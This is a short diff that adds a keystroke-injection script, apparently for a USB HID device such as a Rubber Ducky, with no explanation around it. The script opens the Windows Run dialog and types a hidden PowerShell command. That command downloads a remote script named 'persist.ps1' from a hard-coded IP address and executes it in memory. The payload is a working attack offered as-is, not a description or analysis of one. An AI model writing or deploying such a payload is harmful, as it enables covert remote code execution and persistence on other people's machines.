@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.6.111/persist.ps1')"
+ENTER
